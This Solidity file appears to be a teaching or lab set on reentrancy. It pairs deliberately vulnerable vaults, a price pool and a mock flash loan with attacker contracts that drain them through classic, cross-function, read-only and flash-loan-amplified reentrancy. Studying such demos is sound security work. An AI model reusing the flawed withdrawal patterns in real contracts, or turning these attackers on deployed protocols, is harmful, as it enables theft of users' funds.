// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// ==========================================
// 1. CLASSIC REENTRANCY
// ==========================================
contract ClassicVault {
    mapping(address => uint) public balances;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function withdraw() external {
        uint bal = balances[msg.sender];
        require(bal > 0, "No balance");
        (bool s, ) = msg.sender.call{value: bal}("");
        require(s, "Failed");
        balances[msg.sender] = 0; // VULNERABLE
    }
}
contract ClassicAttacker {
    ClassicVault vault;
    constructor(address _v) { vault = ClassicVault(_v); }
    receive() external payable {
        if (address(vault).balance >= 1 ether) vault.withdraw();
    }
    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }
}

// ==========================================
// 2. CROSS-FUNCTION REENTRANCY
// ==========================================
contract CrossVault {
    mapping(address => uint) public balances;
    mapping(address => bool) public rewardsClaimed;
    function deposit() external payable { balances[msg.sender] += msg.value; }
    function claimReward() external {
        require(balances[msg.sender] > 0, "No stake");
        require(!rewardsClaimed[msg.sender], "Claimed");
        (bool s, ) = msg.sender.call{value: 1 ether}(""); // Reward
        require(s, "Failed");
        rewardsClaimed[msg.sender] = true; // VULNERABLE
    }
}
contract CrossAttacker {
    CrossVault vault;
    constructor(address _v) { vault = CrossVault(_v); }
    receive() external payable {
        if (address(vault).balance >= 1 ether) vault.claimReward();
    }
    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.claimReward();
    }
}

// ==========================================
// 3. READ-ONLY REENTRANCY (Oracle Manipulator)
// ==========================================
contract ReadOnlyPool {
    mapping(address => uint) public balances;
    uint public totalDeposits;
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        totalDeposits += msg.value;
    }
    function withdraw() external {
        uint bal = balances[msg.sender];
        (bool s, ) = msg.sender.call{value: bal}("");
        require(s, "Failed");
        balances[msg.sender] = 0; // VULNERABLE
        totalDeposits -= bal;
    }
    function getPrice() external view returns (uint) {
        if (totalDeposits == 0) return 1e18;
        return (address(this).balance * 1e18) / totalDeposits; // Manipulatable
    }
}
contract InnocentProtocol {
    ReadOnlyPool pool;
    mapping(address => uint) public tokens;
    constructor(address _p) { pool = ReadOnlyPool(_p); }
    function buyTokens() external payable {
        uint price = pool.getPrice();
        tokens[msg.sender] += (msg.value * 1e18) / price;
    }
}
contract ReadOnlyAttacker {
    ReadOnlyPool pool;
    InnocentProtocol victim;
    constructor(address _p, address _v) {
        pool = ReadOnlyPool(_p);
        victim = InnocentProtocol(_v);
    }
    receive() external payable {
        // Pool balance is 0, but totalDeposits is still high! Price is crushed.
        victim.buyTokens{value: 1 ether}();
    }
    function attack() external payable {
        pool.deposit{value: 10 ether}();
        pool.withdraw(); // Triggers fallback
    }
}

// ==========================================
// 4. FLASHLOAN AMPLIFIED (Mock)
// ==========================================
contract MockFlashloan {
    function flashLoan(address receiver, uint amount) external {
        require(address(this).balance >= amount, "Not enough liquidity");
        (bool s, ) = receiver.call{value: amount}("");
        require(s, "Loan failed");
        // Assume repayment check happens here in reality
    }

    receive() external payable {}
}
contract FlashAttacker {
    MockFlashloan flash;
    ClassicVault vault;
    constructor(address _f, address _v) {
        flash = MockFlashloan(payable(_f));
        vault = ClassicVault(_v);
    }
    receive() external payable {
        if (msg.sender == address(flash)) {
            // Received Flashloan -> Attack Vault
            vault.deposit{value: msg.value}();
            vault.withdraw();
            // Repay loan
            payable(address(flash)).transfer(msg.value);
        } else if (msg.sender == address(vault) && address(vault).balance > 0) {
            // Reentrancy loop
            vault.withdraw();
        }
    }
    function attack(uint amount) external {
        flash.flashLoan(address(this), amount);
    }
}